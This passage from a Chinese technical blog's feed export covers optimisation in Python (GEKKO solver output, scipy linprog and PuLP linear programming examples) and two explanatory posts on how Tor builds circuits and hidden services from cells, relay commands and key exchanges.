1.71e-01 4.57e-01 -1.0 9.40e-02 - 8.95e-01 1.00e+00h 1 3 1.6956645e+01 1.57e-01 7.85e-02 -2.0 1.78e-01 - 9.95e-01 1.00e+00h 1 4 1.7009269e+01 1.63e-02 1.20e-02 -2.8 3.94e-02 - 9.94e-01 1.00e+00h 1 5 1.7013888e+01 4.04e-04 1.76e-04 -4.6 6.22e-03 - 1.00e+00 1.00e+00h 1 6 1.7014017e+01 3.92e-07 6.03e-07 -10.4 1.46e-04 - 9.99e-01 1.00e+00h 1 Number of Iterations....: 6 (scaled) (unscaled) Objective...............: 1.7014017127073458e+01 1.7014017127073458e+01 Dual infeasibility......: 6.0264909533529361e-07 6.0264909533529361e-07 Constraint violation....: 3.9234873865091858e-07 3.9234873865091858e-07 Complementarity.........: 7.2865190881096349e-08 7.2865190881096349e-08 Overall NLP error.......: 6.0264909533529361e-07 6.0264909533529361e-07 Number of objective function evaluations = 7 Number of objective gradient evaluations = 7 Number of equality constraint evaluations = 7 Number of inequality constraint evaluations = 0 Number of equality constraint Jacobian evaluations = 7 Number of inequality constraint Jacobian evaluations = 0 Number of Lagrangian Hessian evaluations = 6 Total CPU secs in IPOPT (w/o function evaluations) = 0.004 Total CPU secs in NLP function evaluations = 0.001 EXIT: Optimal Solution Found. The solution was found. The final value of the objective function is 17.0140171270735 --------------------------------------------------- Solver : IPOPT (v3.9) Solution time : 9.099999999307329E-003 sec Objective : 17.0140171270735 Successful solution --------------------------------------------------- Results x1: [1.0] x2: [4.743] x3: [3.82115] x4: [1.379408] 通过这个例子我们可以知道GEKKO给我们提供的接口还是很人性化的。现在归纳下使用流：123456781. GEKKO()初始化类2. 调用类方法Param(value=x)，给模型常量赋值3. 调用类方法m.Var(lb=1, ub=5)，给模型变量定界4. 给类的变量属性赋值初始值5. 调用类方法Equation()构造约束式6. 调用类方法object定义目标函数7. solve()函数进行求解8. 获取结果 参考[1]APM官网[2]Scipy minimize[3]GEKKO]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数模之线性规划]]></title>
    <url>%2F2018%2F12%2F08%2F%E6%95%B0%E6%A8%A1%E4%B9%8B%E7%BA%BF%E6%80%A7%E8%A7%84%E5%88%92%2F</url>
    <content type="text"><![CDATA[线性规划作为数学建模领域的优化类，包括一般的线性规划和整数线性规划，当然也有一批比较成熟的商业软件可以提供建模帮助，如Cplex，LINGO，Gurobi或Mosek等。除此以外，我们也可以使用matlab或者python的第三方库来方便进行线性规划类模型求解。这篇文章主要是介绍python在线性规划模型求解，将从线性规划和整数线性规划来阐述，其中也会介绍一些比较常用的python库。 scipy实现线性规划 matlab linprog 官网 python scipy optimize linprog 官网 python中的线性规划的实现，是借助于scipy库的optimize模块实现的，它的接口定义和matlab的linprog相似。我们可以看到在matlab官方文档里面有一幅图，展示了函数接口的规划线性规划式应有的样子，我们只要按照其接口定义，构造我们的参数，那么他就会自动的帮助我们求解。其实参考了官方的文档，我们可以知道scipy提供了两种线性规划求解函数，linprog(method=’interior-point’)和linprog(method=’simplex’),下面主要介绍simplex methon。 可以看到上面的式子是接口提供的规范，我们需要将我们需要求解的线性规划式子按照规划接口构造。这里主要说明如何使用python定义这个接口规范。下面主要看下在python上，具体如何进行运用。以下常用的一些操作，注意到反回结果是一个对象，当然也可以直接print()（因为其类的实现定义了作为输出字符串时的魔术方法__str__： 123456789from scipy import optimizeimport numpy as np#求解函数res = optimize.linprog(c,A,b,Aeq,beq,LB,UB,X0,OPTIONS) # or res = optimize.linprog(c,A,b,Aeq,beq,bounds=(x1,x2,x3,......),OPTIONS) #目标函数最小值print(res.fun)#最优解print(res.x) 下面以《matlab在数学建模中应用》这本书上的例题来进行一个使用案例分析： 1234567891011121314151617181920from scipy import optimize as opimport numpy as npc=np.array([2,3,-5]) #定义最值式，注意要改变式子使其符合求解最小值A_ub=np.array([[-2,5,-1],[1,3,1]]) #这里对左右两边取反，使得条件与接口式形式上一致A_ub_=np.array([-10,12])A_eq=np.array([[1,1,1]])B_eq=np.array([7])x1=(0,7)x2=(0,7)x3=(0,7)res=op.linprog(-c,A_ub,B_ub,A_eq,B_eq,bounds=(x1,x2,x3))# 整体输出print(res)# 获取结果属性print(-res.fun)# 获取最优解print(res.x) fun: -14.571428571428571 message: &#39;Optimization terminated successfully.&#39; nit: 2 slack: array([3.85714286, 0.57142857, 6.42857143, 7. , 0. ]) status: 0 success: True x: array([6.42857143, 0.57142857, 0. ]) 14.571428571428571 [6.42857143 0.57142857 0. ] 我们可以注意到，由于这个线性规划是求解最大值，为了让适应规划接口，我们需要把之转化为求最小值的形式，然后对结果的对应操作就是取相反数。另外一点比较容易出错的地方是，注意到接口规范只有小于形式的条件（如图一中的第一个条件），如果事迹建模中出现了大于形式的条件，就要左右取反操作。 PuLP实现线性规划受限于scipy的整数线性规划的鸡肋，不得不开辟新的战场。经过一番搜索，得知了PuLP这个库，然后去官网浏览了一波。没错了！这就是我想要的。看了PuLP这个库的相关整体架构后，以及用户接口友好程度，你一定会像我这么感慨的：Amazing!作为解决LP问题，这个库比较小巧，专门解决LP问题，包括整数和连续变量两种变量类型，而且用户接口实现都很pythonic。PuLP大致可以简化为四个个组件：LPproblem（实例化线性回归构造器，对比scipy的沿用matlab的接口定义，PuLP的接口就很人性化，真的，你会这样认为的！），solvers（定制化算法求解引擎），LpVariable(定义变量的类型，连续或者整形)，Constraints（其他的约束条件）。官方给了四个使用PuLP解决实际问题的例子，参考链接[5]也给出了一些使用PuLP的解决案例。这里选取一个比较简单的第一个官方案例进行常规编程接口和步骤归纳。官方式例如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# Import PuLP modeler functionsfrom pulp import *# Creates a list of the IngredientsIngredients = ['CHICKEN', 'BEEF', 'MUTTON', 'RICE', 'WHEAT', 'GEL']# A dictionary of the costs of each of the Ingredients is createdcosts = &#123;'CHICKEN': 0.013, 'BEEF': 0.008, 'MUTTON': 0.010, 'RICE': 0.002, 'WHEAT': 0.005, 'GEL': 0.001&#125;# A dictionary of the protein percent in each of the Ingredients is createdproteinPercent = &#123;'CHICKEN': 0.100, 'BEEF': 0.200, 'MUTTON': 0.150, 'RICE': 0.000, 'WHEAT': 0.040, 'GEL': 0.000&#125;# A dictionary of the fat percent in each of the Ingredients is createdfatPercent = &#123;'CHICKEN': 0.080, 'BEEF': 0.100, 'MUTTON': 0.110, 'RICE': 0.010, 'WHEAT': 0.010, 'GEL': 0.000&#125;# A dictionary of the fibre percent in each of the Ingredients is createdfibrePercent = &#123;'CHICKEN': 0.001, 'BEEF': 0.005, 'MUTTON': 0.003, 'RICE': 0.100, 'WHEAT': 0.150, 'GEL': 0.000&#125;# A dictionary of the salt percent in each of the Ingredients is createdsaltPercent = &#123;'CHICKEN': 0.002, 'BEEF': 0.005, 'MUTTON': 0.007, 'RICE': 0.002, 'WHEAT': 0.008, 'GEL': 0.000&#125;# Create the 'prob' variable to contain the problem dataprob = LpProblem("The Whiskas Problem", LpMinimize)# A dictionary called 'ingredient_vars' is created to contain the referenced Variablesingredient_vars = LpVariable.dicts("Ingr",Ingredients,0)# The objective function is added to 'prob' firstprob += lpSum([costs[i]*ingredient_vars[i] for i in Ingredients]), "Total Cost of Ingredients per can"# The five constraints are added to 'prob'prob += lpSum([ingredient_vars[i] for i in Ingredients]) == 100, "PercentagesSum"prob += lpSum([proteinPercent[i] * ingredient_vars[i] for i in Ingredients]) &gt;= 8.0, "ProteinRequirement"prob += lpSum([fatPercent[i] * ingredient_vars[i] for i in Ingredients]) &gt;= 6.0, "FatRequirement"prob += lpSum([fibrePercent[i] * ingredient_vars[i] for i in Ingredients]) &lt;= 2.0, "FibreRequirement"prob += lpSum([saltPercent[i] * ingredient_vars[i] for i in Ingredients]) &lt;= 0.4, "SaltRequirement"# The problem data is written to an .lp fileprob.writeLP("WhiskasModel2.lp")# The problem is solved using PuLP's choice of Solverprob.solve()# The status of the solution is printed to the screenprint ("Status:", LpStatus[prob.status])# Each of the variables is printed with it's resolved optimum valuefor v in prob.variables(): print (v.name, "=", v.varValue)# The optimised objective function value is printed to the screen print ("Total Cost of Ingredients per can = ", value(prob.objective)) Status: Optimal Ingr_BEEF = 60.0 Ingr_CHICKEN = 0.0 Ingr_GEL = 40.0 Ingr_MUTTON = 0.0 Ingr_RICE = 0.0 Ingr_WHEAT = 0.0 Total Cost of Ingredients per can = 0.52 上面是一个有关猫食选择的最有解决案例，具体的题目可以去参看官方文档，这里仅仅对使用PuLP进行线性规划的流程进行一个大致的归纳： 1234567891011121314151. prob = LpProblem("The Whiskas Problem", LpMinimize)#实例化LpProblem构造类,第一个参数是自定义的线性规划取名，第二参数可以指定求解的类型是 max or min2. A = pulp.LpVariable('A', lowBound=0, cat='Integer')#pulp变量定义，参数包括取名，上下限，类别，整形或连续3. prob+=...... prob+=...... ...... #依次构造目标函数和约束条件，注意到，我们可以对目标函数或者约束项取名4. prob.writeLP() #调用内部函数，将prob对象进行输出到指定文件5. prob.solve() #进行模型求解，这里将采用默认的算法引擎求解，这个函数可以接受参数，我们可以定制化slover类传入，具体参考官方文档6. print ("Status:", LpStatus[prob.status]) print (v.name, "=", v.varValue) print ("Total Cost of Ingredients per can = ", value(prob.objective)) #获取计算结果 除了这两个库之外，pyomo也是个不错的库，还有就是导言提到的Gurobi使用python作为编程语言这个商业化软件，也是很不错的求解线性规划的方案。 参考资料[1]Pulp官网[2]Pyomo官网[3]pymprog官网[4]python 整数线性规划和线性规划[5]Introduction to Linear Programming with Python and PuLP]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tor匿名协议理解二]]></title>
    <url>%2F2018%2F12%2F06%2Ftor%E5%8C%BF%E5%90%8D%E5%8D%8F%E8%AE%AE%E7%90%86%E8%A7%A3%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[在之前的一篇文章中，大致上介绍了客户端通过Tor网络实现匿名访问，以及服务器实现匿名服务的大致过程。在其中忽略了结点之间的连接细节，这篇文章将要针对结点间链路的建立细节展开叙述。 概述Tor匿名协议是建立在tcp连接之上的，在tcp之上运行着TLS传输层加密协议，保证Tor网络的对外加密性。注意到这里的对外加密和匿名性不是一个概念。对外加密是TLS实现，而匿名性则是通过链路机制实现。而链路是靠Cells建立的。所谓的Cells,可以直接理解成为了实现tor的匿名性而特意构建数据包（当然这不算严谨，后面会看到）。在这之中包含了一些标识位，这些标识位中的command字段，是整个网络的灵魂。控制着链路的创建，拓展，销毁；流的建立和应用数据的传输等等。 这里出现了三个比较容易混淆的概念：连接，链路，流，搞清这三个概念十分重要。连接的建立靠传输层TLS协议，保证了两节点间物理可通，是这一切的基础；而链路是通过Cells机制逐跳拓展的，链路真正实现了匿名性，在Cells中会有一个固定的字段标识一条链路；流是传输在链路之上的应用层数据，用来实现应用的通信，也会在Cells中唯一标识。所以从上到下的依赖关系为：流—-&gt;链路—-&gt;连接。 CellsCell是Tor中通信单元，也可以直接理解为。其本身在tcp/ip协议里面是应用层data部分。然后Tor通过把data也进行了字段的划分，如下图所示，把一些控制字段放在前，真正的数据部分放在payload字段。 如图，Tor协议中的数据包有两种，一种是定长Cell,一种是不定长Cell。链路的建立，拓展销毁，数据流的传送主要还是通过定长的Cells；而不定长的Cells主要用在握手协议上。 数据格式中的CMD1234567891011121314151617181920212223定长 Cell:0--PADDING （ Padding）1--CREATE （ Create acircuit）2--CREATED （ Acknowledge create）3--RELAY （ End-to-end data）4--DESTROY （ Stop using acircuit）5--CREATE_FAST（ Create acircuit， no PK）6--CREATED_FAST （ Circuit created， no PK）8--NETINFO （ Time andaddress info）9--RELAY_EARLY （ End-to-end data； limited）10--CREATE2 （ Extended CREATEcell）11--CREATED2 （ Extended CREATEDcell）不定长Cell:7--VERSIONS （ Negotiateprotocol version）128--VPADDING （ Variable-length padding）129--CERTS （ Certificates）130--AUTH_CHALLENGE（ Challenge value）131--AUTHENTICATE （ Client authenticate）132--AUTHORIZE （ Client authorization 以上是Cell中的CMD字段的值，前面的数字是命令代号，也就是直接显示在CMD位上的数值。通过两种Cell的不同命令设计，我们可以比较直观的看到两者的侧重点不一样，定长的Cell控制链路，而不定长的Cell偏向于连接的建立和认证。 定长Cell与RELAY Cell由于与匿名通信最直接相关的是定长的Cell，所以接下来我们主要分析定长的Cell的结构和链路控制的细节，从而弥补上一讲我们忽视的链路建立的细节。 定长CELL的固定长度为 512字节，其中链路 ID域占 2字节，数据指令域占1字节，负载占509字节。定长CELL主要用于链路相关操作：建立链路，维护链路，数据传输，断开链路等。另外，定长CELL还根据命令类型的不同分为控制数据Cell和转发数据Cell。其中， 控制数据Cell由洋葱路由器OR负责解释并处理， 转发数据Cell则用来发送端到端的数据（如图可以看到转发数据包的特殊格式）。注意到的是，每一种命令的Cell都会有自己的类似图中RELAY的自定义结构，这里为了解释链路的建立大致过程，抓住主要思想，详细解析RELAY转发Cell的细节，在之后的系列文章中，会逐渐把每种包的结构和细节进行阐述。 转发数据包头部共 11个字节， 分别为： CMD， 转发指令； Recog， 指定某个洋葱路由器接收的标志位； SID，数据流ID编号； CheckSum，数据流端到端验证用到的校验和； Len，负载中真实数据的长度。整个转发数据包，包括头部和负载， 在Tor网络传输过程中均利用CRT模式下的128-bit AES加密方式进行加密。 数据包延数据链路传递， 被逐跳解密，直到某一跳的洋葱路由器OR成功获得全 0的标志位 Recog，并成功验证数据包的校验和。该洋葱路由器再读取转发数据包头部的具体信息进行相应操作。 Relay CELL的指令域123456789101112131415161--RELAY_BEGIN [forward]2--RELAY_DATA [forward orbackward]3--RELAY_END [forward orbackward]4--RELAY_CONNECTED [backward]5--RELAY_SENDME [forward orbackward][control]6--RELAY_EXTEND [forward]7--RELAY_EXTENDED [backward]8--RELAY_TRUNCATE [forward]9--RELAY_TRUNCATED [backward]10 --RELAY_DROP [forward orbackward][control]11 --RELAY_RESOLVE [forward]12 --RELAY_RESOLVED [backward]13 --RELAY_BEGIN_DIR [forward]14 --RELAY_EXTEND2 [forward][control]15 --RELAY_EXTENDED2 [backward][control]32..40 -- 用于Hidden Service的Relay指令第二章 第二代洋葱路 其中， RELAY_BEGIN用于打开一个应用数据流；RELAY_DATA用于传送应用数据；RELAY_END用于彻底关闭一个应用数据流； RELAY_EXTEND和RELAY_EXTENDED用于将链路进行一跳的拓展；RELAY_TRUNCATE和RELAY_TRUNCATED用于将链路进行截断处理，也用于链路错误消息响应；RELAY_SENDME用于流量控制； RELAY_BIGIN_DIR用于开启到目录服务器的数据链路。同时，上述指令中仅被标记为forward的指令只能由链路发起者发送；仅被标记为 backward的指令只能由链路中的结点发送回链路发起者。另外，control标记主要表示该命令是用于链路相关控制，和应用层数据并无关系。 链路的建立与应用通信为了解析链路的建立细节，我们看官方设计文档的一张图： Alice是通信的发起者，并希望通过Tor 网络匿名地浏览 Website的内容。Alice的洋葱代理 OP首先选择Tor网络的中间转发结点并与之协商短期会话密钥，从而逐步建立一条通向Website的链路。 而后，当链路建立完成时， OP可以指示链路出口结点开启到 Website的 TCP连接，从而实现Alice与Website之间的匿名通信。具体的通信过程为（忽略了连接建立的过程，按照图中时序进行标号对应）： （1）Alice的洋葱代理OP首先发送一个Create命令数据包给它选定的第一个洋葱路由器 OR1（Bob）。其中c1表示Alice与Bob之间的链路 CircID， E(gx1)表示利用Bob洋葱密钥公钥加密的 DH 握手协议的第一部分内容。 （2）当 Bob接收到Alice发送来的Create命令数据包之后，返回一个对应的 Created 数据包。该数据包中包含：c1，Alice与 Bob之间的链路CircID；DH握手协议的第二部分内容的明文， gy1；临时会话密钥K1（gx1 ⋅y1）的哈希值， H(K1)。一旦链路建立， Alice和Bob就可以发送转发数据包（ Relay Cell），转发数据包的负载部分（ 509B）用其协商好的会话密钥Kl进行加密。 （3）为了扩展链路，Alice发送一个用 K1加密过的Relay Extend数据包（此数据包为转发数据包）给 Bob，其中包含： c1，Alice与Bob之间的链路 CircID；Relay指令 Extend：下一跳需要拓展到的洋葱路由器（Carol）的地址OR2；利用Carol洋葱密钥公钥加密的 DH握手协议的第一部分内容E(gx2)。 （4）Bob正确接收到Alice发送来的拓展命令之后，构建一个Create命令数据包。其中，c2表示Bob与Carol之间的链路CircID，E(gx2)是从 Alice处接收到的消息内容，表示利用Carol洋葱密钥公钥加密的DH握手协议的第一部分内容。Carol并不知道 Alice的存在。 （5）如Bob接收到Create命令数据包时一样，Carol返回一个Created数据包，其中包含：c2，Bob与 Carol之间的链路CircID；DH握手协议的第二部分内容的明文，gy2：临时会话密钥 K2（gx2⋅y2）的哈希值，H(K2)。 （6）当Bob收到 Carol响应信息后，Bob用他和Alice之间的会话密钥 Kl加密一个Relay Extended数据包（包含gy2和H(K2)），然后将它发回给 Alice。如此，原链路被拓展到了 Carol，且Alice和Carol的会话密钥为 K2。Alice只需重复上述过程，就可将虚电路长度逐步扩展，并最终与目的节点建立连接。一般说来，链路的长度应该为3以上，上图为了解释原理，进行了简化。 （7）当链路建立完毕后，Alice需要与website实现TCP层面上的握手。这时利用之前建立的链路，发送一个C1：Begin&lt;website&gt;:80命令到Bob。 （8）Bob经检验是合法的Alice传来的Begin命令后，向链路2转发C2：Begin&lt;website&gt;:80给Carol,然后按照这样的规律层层继续。在最后一个结点(图示中是Carol)负责开启一个TCP连接去获取网站信息。当连接建立完成，最后一个结点会层层回传连接建立成功的包。Carol回传Relay C2{connected}给Bob （9）Bob接收到Carol回传的连接建立Cell后，进行转发给Alice，Relay C1{connected} （10）当Alice接收到连接建立成功的消息后，Alice上层应用的数据就可以通过OP进行分片和利用之前链路建立协商的密钥进行层层加密，如同{ { {Payload} K1} K2 }K3。依次通过链路进行信息通信。 回顾这篇文章也是比较大致的阐述了链路建立的相关细节，并且使用的是官方设计文档的图例，这个图例是客户端实现匿名访问明网服务的的过程。理解了这个过程，读者可以发散思维，不难把它类比联想到客户端和匿名服务进行交互的细节。在访问匿名服务的时候，只不过是两端都建立了一条链路，通过约会结点来实现互通，而约会结点的协商则是通过客户端向介绍结点发送约会节点的ip和一次性秘密信息唯一标识一个约会结点并且通过一次性秘密信息来实现约会结点的认证。 参考https://svn.torproject.org/svn/projects/design-paper/tor-design.pdf https://gitweb.torproject.org/torspec.git/tree/tor-spec.txt]]></content>
      <categories>
        <category>协议</category>
      </categories>
      <tags>
        <tag>网络协议</tag>
        <tag>匿名通信</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tor匿名协议理解一]]></title>
    <url>%2F2018%2F12%2F06%2Ftor%E5%8C%BF%E5%90%8D%E5%8D%8F%E8%AE%AE%E7%90%86%E8%A7%A3%E4%B8%80%2F</url>
    <content type="text"><![CDATA[近来对匿名网络的原理比较感兴趣，当然在现在的世界上也有者着一批匿名协议，其中tor的匿名协议可以说是比较成功的，所以打算以tor匿名协议为例，研究匿名通信的相关理论以及实现细节，这篇文章作为一个开篇，记录学习路上的心得。 概览 以下对tor协议系统的总结翻译自说明文档 Tor是一个基于TCP的，低延迟的匿名分布式覆盖网络应用集合，比如web浏览器，secure shell,即时通讯等。客户端通过网络建立一个链路，在这个链路中，每一个结点（OR），只知道它的前一个结点和后一个节点，但是不会知晓其他任何结点的相关信息。信息以固定大小的包流通在链路上，每个流过结点都使用对称密钥来解包，就好像一层一层的洋葱一样，然后包依次传递给下一个结点。 前置知识TLS（Transport Layer Security）安全传输层协议（TLS）用于在两个通信应用程序之间提供保密性和数据完整性。TSL是SSL的标准化，也就是访问https网址时候使用的加密协议，在tor协议里面，TSL用来进行每一层的通信加密。 协议的运行包含有三个阶段：12345（1） 客户端向服务器端索要并验证公钥。（2） 双方协商生成&quot;对话密钥&quot;。（3） 双方采用&quot;对话密钥&quot;进行加密通信。 更多的原理细节可以查看：https://en.wikipedia.org/wiki/Transport_Layer_Security Diffie-Hellman一种确保共享KEY安全穿越不安全网络的方法，也是现在普遍使用密钥交换协议。 更多细节请查阅：https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange Hash函数hash函数是一种将信息散列到固定长度的字符串的技术。 更多的细节可以查看：https://en.wikipedia.org/wiki/Hash_function 分布式哈希更多的细节可以查看： https://en.wikipedia.org/wiki/Distributed_hash_table https://colobu.com/2018/03/26/distributed-hash-table/ 一致性hash更多的细节可以查看： https://zh.wikipedia.org/wiki/%E4%B8%80%E8%87%B4%E5%93%88%E5%B8%8C http://afghl.github.io/2016/07/04/consistent-hashing.html 基本概念术语注意到下面的概念，读者一开始或许比较难以理解，觉得云里雾里。可以大致浏览一下，作为词典来对后面的协议解释中出现的专业名词进行回查。 OP（OnionProxy）：洋葱代理客户端，可以理解为下载了洋葱路由器的客户端,并且准备通过其进入匿名网络，访问匿名服务器或者通过tor网络来进行网络访问的客户端。需要注意的是客户端不参与路由。 OR（OnionRouter/Relays）：负责路由的一些中继结点集群。这些是真正的匿名访问实现的主干，是由一批志愿的路由集群组成，现在的路由结点大约在10000个左右。官方文档中所说的Relays,其实与之是同一个概念。 HS(Hidden Service:):匿名服务器是在洋葱网络里面提供服务的一批服务器，类似于外网中的服务器，只不过它的访问只能通过洋葱网络，并且根据匿名服务协议的规范，可以很好的保护匿名服务器。在外部网络中是不可以访问得到的。这类服务的域名通常由.onion结尾。 AS（App Server）：在洋葱网络中提供服务的服务器，和现实中的服务器的差别在于其是不需要通过DNS查询，而实基于一套匿名协议 标识符（Descriptor）：是一个唯一标识洋葱网络里面的路由（OR）结点（匿名服务器在宏观上也可归结为OR）的信息流，里面有IP，结点状态等基本信息，用来提交给目录权威来更新目录共识。 目录共识（consensus，下文直接称共识）：共识其实是一个文本，里面根据协议的规范，记录了洋葱网络里面的每一个路由结点的信息，包括一些状态标识，描述符，IP，端口，加密方式等等一系列的基本信息。并且由权威目录共同维护，更新，同步。该文件同步到每个客户端后，通常存放在[洋葱路由器安装目录]\Browser\TorBrowser\Data\Tor\cached-microdesc-consensus DS/DA（Directo Server/Directory Authority）：目录服务器，官方文档中也习惯性将之目录权威。是整个tor协议的指挥官，一般数目为10个左右，他们之间是一个分布式的共识系统，存储着整个洋葱网络路由结点的基本信息（有时也称为共识），每个洋葱路由结点都需要基于一定的时间向目录权威提交标识符来进行状态更新，同步和维护。目录权威里面还保存着一个长期使用的私钥，用来对证书进行签发。这个私钥是区别于洋葱路由的私钥的（这个细节是在版本2后修改的，过去目录权威的私钥和其作为OR时候的私钥是同一个）。权威目录在整个tor匿名服务不会改变，并且被直接硬编码到二进制文件，相关记录在源码里的\src\or\auth_dirs.inc 出口结点（Exit relay）：在tor的路由协议中，客户端（OP）想要访问实体网络，假设是www.baidu.com,那么它首先需要建立三跳的客户端匿名协议，然后在最后一个路由结点就称为出口节点，用来访问tor网络外部的服务器（www.baidu.com） 非出口结点（No-exit relay）:只在洋葱网络里面进行收发的不与外界网络相连的结点。可以和出口节点进行对比理解。 入口结点（Entry relay）：在客户端三跳实例中的第一个入口结点，是OP连入洋葱网络的第一个结点。通常是由守卫结点（Guard relay）和桥（Bridge）来扮演。 桥（Bridge）：桥是一批不出现在洋葱共识文件里面的结点，他们的存在是为了绕过一些国家或地区对tor的封锁，可以大致理解为一个代理，这些代理拥有连入tor网络的能力，但是不被记录在共识文件里面。 守卫结点（Guard relay）: 由OP选定的长期使用的作为第一个网络接入点的路由结点（OR），可以看成是一批特殊的OR，其目的就是为了降低一些可能的攻击带来的危害，在后面的针对Tor协议的常见攻击一节将会进行比较细致的讲解。 约会结点（Rendezvous point）：约会结点是在客户端连接tor匿名服务器的时候指定的交汇路由节点，用来连接介绍结点和客户端三跳路由结点。 目录缓存（Directory cache relays）:一些带宽比较大的路由节点，可以作为目录权威的缓存结点，提供给客户端获取共识文件，缓解权威目录的负载压力。而其本身的共识文件是根据目录权威来更新同步，然后权威通过分布式容错共识算法达成一致。所以权威目录具有这个洋葱网络路由记录（共识）的最终决定权。 可靠的目录镜像（ Fallback directory mirror）：这是个硬编码的初始目录列表，在源码的\src\or\fallback_dirs.inc进行记录。编译后就直接硬编码到二进制文件里，用来进行第一次共识的同步和更新。 链路（Circuit）：链路是在TLS连接建立的基础上，通过tor协议，一系列的cell的传输，通过其携带的一系列Create地Extend包等来构成一条通信链路。然后应用程序，这里专指web可以通过这条链路建立不同的通信流。从而完成通信。 客户端匿名访问协议和服务隐藏协议客户端匿名访问协议所谓的匿名访问协议指的是保护访问者的身份的一个Tor协议，它的实现是在已经建立的TLS链接的基础上，通过依次与OR进行DF密钥协商，然后使用交换后的加密密钥来进行上层应用的通信。因为协商密钥的过程是OP与OR依次按照顺序进行的，所以每个OR结点都只能知晓和自己相连的前一个和后一个节点，这样就可以起到很好的客户端匿名访问的功能。 以下图例来自官网，文字借鉴参考官方文档和硕士论文：《基于Tor的反向匿名信道建立技术研究》 Alice为使用洋葱代理OP的用户； Dave为目录服务器； Jane和 Bob为应用服务器（例如， Web服务器）；其他主机为互联网中的主机；而带绿色十字标志的为Tor网络中的结点，也就是洋葱路由器OR。此处以 Alice通过Tor网络进行应用服务器的访问为例，简单介绍Tor的主要工作过程。Alice在使用 Tor之前， 首先需要在其主机上安装洋葱代理OP并运行， 并将浏览器或其他需要使用匿名通信服务的应用程序的代理设置为本地 OP所监听的地址与端口。之后， Alice可以按照常规方式使用应用程序而无需做任何其他 Tor相关的操作。被启动之后， OP利用连通的Tor网络透明地执行以下过程：（1） OP尝试连接目录服务器，以获取Tor网络的结点信息；（2）当最新的 Tor网络结点列表被成功下载之后， OP可以根据自身默认的配置以及用户的配置进行Tor结点的选择，从而建立如下图所示的数据链路： 得注意的是，在链路建立的过程中，每次只拓展一个链路结点（关于建立连接和拓展的过程我们将在下一篇中进行细致的讲解）。并且， OP与链路上的每一个结点都会协商一组独立的对称密钥。这样，确保了每一跳在传送数据包时都无法被跟踪，也就是说，链路上的每一个结点只知道其前序结点和后继结点，而不会知道整条完整的链路。图2.2中，从Alice开始，绿色连接线的部分说明 Alice通过三次链路拓展形成一条完整的链路，并且链路是经过加密的。链路的出口结点利用非加密的方式连接到了应用服务器Bob。（3）一旦通信链路建立完成，各种类型的数据均可以进行交换，或者说各种不同类型的应用程序都可以利用 OP作为代理而是用Tor提供的匿名通信服务。当前， Tor仅支持 TCP数据流，并能够被支持SOCKS的任何应用程序所使用。 （4）为了提高效率和安全性， OP对数分钟内的连接请求均使用同一条链路，而之后的针对不同应用服务的连接请求又将被关联到新的链路，从而来防止攻击者将用户旧的行为和新的行为联系在一起。 如图2.3所示， 当用户需要请求新的应用服务之时，OP建立新的链路为用户应用请求服务。 以上就是客户端选择路由结点并且进行横向拓展的大致过程，但是其中很多的细节我们没有进行很深入的阐述，特别是连接的建立和多路复用的概念等，我们将在下一节中进行探究。 服务端隐藏协议在之前的讨论中，可以看到在Tor的协议中，客户端的匿名是可以得到保证的，那么在实际应用中，光光保护客户端的匿名性是不够的。服务端的匿名性也需要得到体现，所以服务端隐藏协议的目标是为想要对外提供服务的Tor服务器隐藏其具体位置。而这个功能在tor协议中是通过介绍结点和约会结点来直接体现的。以下是具体的服务端身份匿名。 （1）Tor用户为了能够匿名地对外提供服务， 需要对Tor网络声明其存在。于是，在正式提供服务之前， Tor用户需要随机选取Tor 网络内的几个中继结点，建立到这些结点的链路，并通过告知这些结点该用户的服务公钥的方式来请求结点作为其介绍结点（ Introduction Point ）。 如图所示，提供匿名服务的 Tor用户Bob建立到IP1， IP2， IP3的三条链路， 并请求他们成为匿名服务的介绍结点。 而IP1， IP2， IP3三者只知道服务相关的公钥，并不知道提供服务的 Bob的IP地址或身份。 （2）如下图所示， Bob为其特定的匿名服务生成一个匿名服务描述符。该描述符之中包括服务对应的公钥，服务介绍结点列表，以及利用服务私钥对该描述符前述部分的签名。匿名服务描述符在生成成功之后，被上传到分布式哈希表以供其他 Tor用户查找。查找索引为“ XYZ.onion” ，其中 XYZ为由匿名服务公钥生成而来的服务名， 包括 16个英文字母。 在该步完成之后， 匿名服务已被成功设置，并等待提供服务。 （3）当一个Tor用户想要请求匿名服务时， 需要先利用其他途径获得该匿名服务对应的洋葱地址， 即前述的“ XYZ.onion”。 得到洋葱地址之后， 该用户通过询问分布式哈希表来获得匿名服务描述符。若该描述符存在，则通过描述符，用户即可得知匿名服务的介绍结点列表以及所使用的公钥信息。在此期间，用户建立一条链路到一个随机挑选的中继结点，并通过告知该结点一个一次性秘密信息来请求其作为该用户的约会结点（ rendezvous point）。 （4）当匿名服务描述符下载完毕， 约会结点也成功设置之后， 请求匿名服务的 Tor用户构造一个由匿名服务公钥加密的消息。该消息的内容为约会结点的地址，以及先前预先协商完成的一次性秘密信息。该消息将通过 Tor链路被发送至匿名服务的某一个介绍结点， 而介绍结点则会将该消息回传给匿名服务提供者。如图2.11所示，匿名服务的提供方Bob与请求方Alice均通过Tor链路来进行数据通信，双方的身份信息都不会被泄露，从而保证了双方的安全性。 （5）匿名服务提供者 Bob获得匿名服务用户Alice发送来的加密的服务相关消息之后，进行解密，并获得其中的约会结点地址及一次性秘密信息。而后，Bob建立一条链路以连接到约会结点， 并向其发送接收到的一次性秘密信息。整个过程如图 （7）约会结点将已连接到匿名服务提供者Bob的消息告知匿名服务请求者Alice。在 Alice接收到该消息之后，其便可以利用通过约会结点建立起来的链路进行类似于常规Tor网络通信的正常通信。对于 Bob而言，也是类似的。主要的差别在于， Alice与Bob之间建立的链路是特殊链路，该链路在通常情况下由6个结点组成。在链路之中的约会结点很明了地知道自身的身份：约会结点。 整个HiddenService协议的运行过程之中，协议力求保证通信双方的匿名性。协议中所选用的IP1， IP2， IP3，以及RP均无法确切得知通信双方的身份及地理位置， 匿名性由Tor链路的特性（ 单个路由无法得知整条链路） 提供保障。 最终通信双方生成的链路为一条长链路， 通常情况下为6跳。 